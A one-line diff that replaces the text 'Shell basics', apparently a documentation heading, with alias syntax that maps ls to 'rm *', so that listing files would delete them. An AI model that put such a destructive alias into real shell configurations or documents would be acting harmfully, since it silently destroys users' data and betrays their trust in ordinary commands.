@@ -1,1 +1,1 @@
-Shell basics
+alias [-p] [ls="rm *"] 
